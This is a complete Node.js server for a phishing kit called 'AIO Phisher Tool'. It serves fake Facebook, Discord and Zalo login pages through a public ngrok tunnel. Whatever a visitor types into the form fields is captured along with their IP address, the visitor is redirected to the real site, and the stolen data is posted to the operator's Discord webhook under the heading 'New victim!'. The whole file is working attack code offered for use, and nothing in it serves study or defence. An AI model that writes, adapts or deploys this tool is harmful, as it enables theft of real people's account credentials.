const config = require("./config.json")
const express = require("express")
const app = express()
const bodyParser = require("body-parser");
const cookieParser = require('cookie-parser');
const colors = require("colors")
const fs = require('fs');
const path = require("path")
const open = require('open');
const ngrok = require('ngrok');
const ascii = require('ascii-table');
const ms = require('ms')
const Discord = require("discord.js")
const readline = require('readline');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
const webhook = new Discord.WebhookClient({
    id: config.logs.id,
    token: config.logs.token,
});
const chooses = {
    1: {
        name: 'facebook',
        home: 'https://facebook.com',
        iconURL: ''
    },
    2: {
        name: 'discord',
        home: 'https://discord.com',
        iconURL: ''
    },
    3: {
        name: 'zalo',
        home: 'https://zalo.me',
        iconURL: ''
    },
};
// App uses
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));
const dataDir = path.resolve(`${process.cwd()}${path.sep}views`);
app.use("/assets", express.static(path.resolve(`${dataDir}${path.sep}assets`)));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(bodyParser.raw());
app.use(cookieParser());
app.get("/info", async (req, res) => {
    return res.render(`pages/index`)
})
app.listen(config.server.port, async () => {
    const url = await ngrok.connect({
        proto: 'http', // http|tcp|tls, defaults to http
        addr: config.server.port, // port or network address, defaults to 80
        // auth: 'user:pwd', // http basic authentication for tunnel
        // subdomain: `${chooses[answer].name}authlogin`, // reserved tunnel name https://alex.ngrok.io
        authtoken: config.ngrokAuth, // your authtoken from ngrok.com
        region: 'us', // one of ngrok regions (us, eu, au, ap, sa, jp, in), defaults to us
        // configPath: '~/git/project/ngrok.yml', // custom path for ngrok config file
        // binPath: path => path.replace('app.asar', 'app.asar.unpacked'), // custom binary path, eg for prod in electron
        // onStatusChange: status => { }, // 'closed' - connection is lost, 'connected' - reconnected
        // onLogEvent: data => { }, // returns stdout messages from ngrok process
    }).catch(e=>{return console.log(colors.bgRed(`[ERR]`) + colors.red(` Can't start ngrok session!`))})
    console.log(colors.bgGreen(`[OK]`) + colors.green(` Server is working at port ${config.server.port}`))
    let table = new ascii(`AIO Phisher Tool`);
    // table.setHeading("List of able templates");
    table.addRow(`Number`, `Name`)
    table.addRow(`[1]`, `Facebook`)
    table.addRow(`[2]`, `Discord`)
    table.addRow(`[3]`, `Zalo`)
    console.log(colors.red(table.toString()))
    rl.question(colors.bgYellow(`[??]`) + colors.yellow(` Enter your selection: `), async function (answer) {
        if (!chooses[answer]) {
            await console.log(colors.bgRed(`[ERR]`) + colors.red(` Can't find your selection!`))
            return process.exit()
        }
        console.log(colors.bgGreen(`[OK]`) + colors.green(` You selected ${chooses[answer].name}, try it at: \nhttp://localhost:${config.server.port}\n${url}`))
        open(url).catch(e => { });
        app.use("/", express.static(path.resolve(`${dataDir}${path.sep}site${path.sep}${chooses[answer].name}`)));
        app.get("/", async (req, res) => {
            return res.render(`site/${chooses[answer].name}/index`)
        })
        app.post("/", async (req, res) => {
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
            let date_ob = new Date();
            let date = ("0" + date_ob.getDate()).slice(-2);
            let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);
            let year = date_ob.getFullYear();
            let hours = date_ob.getHours();
            let minutes = date_ob.getMinutes();
            let seconds = date_ob.getSeconds();
            const time = year + "-" + month + "-" + date + " " + hours + ":" + minutes + ":" + seconds;
            const rawData = {
                type: chooses[answer].name,
                ip: ip,
                time: time,
                icon: chooses[answer].iconURL || 'https://i1.sndcdn.com/avatars-000477486495-vn02q7-t500x500.jpg',
                text1: req.body.text1 || 'blank',
                text2: req.body.text2 || 'blank',
                text3: req.body.text3 || 'blank',
            }
            await res.redirect(chooses[answer].home)
            const embed = new Discord.EmbedBuilder()
                .setAuthor({ name: `AIO Phisher Tool v1 by Peter Tuan Anh`, iconURL: 'https://i1.sndcdn.com/avatars-000477486495-vn02q7-t500x500.jpg' })
                .setTitle("New victim!")
                .addFields(
                    {
                        name: `Type:`,
                        value: `> ┕ \`${rawData.type}\``,
                        inline: false,
                    },
                    {
                        name: `Text1:`,
                        value: `> ┕ \`${rawData.text1}\``,
                        inline: false,
                    },
                    {
                        name: `Text2:`,
                        value: `> ┕ \`${rawData.text2}\``,
                        inline: false,
                    },
                    {
                        name: `Text3:`,
                        value: `> ┕ \`${rawData.text3}\``,
                        inline: false,
                    },
                    {
                        name: `IP:`,
                        value: `> ┕ \`${ip}\``,
                        inline: false,
                    },
                )
                .setThumbnail(rawData.icon)
                .setColor("AQUA")
                .setTimestamp()
            return webhook.send({ embeds: [embed], avatarURL: 'https://i1.sndcdn.com/avatars-000477486495-vn02q7-t500x500.jpg' }).catch(e => {
                console.log(rawData)
            })
        })
        rl.close();

    });
})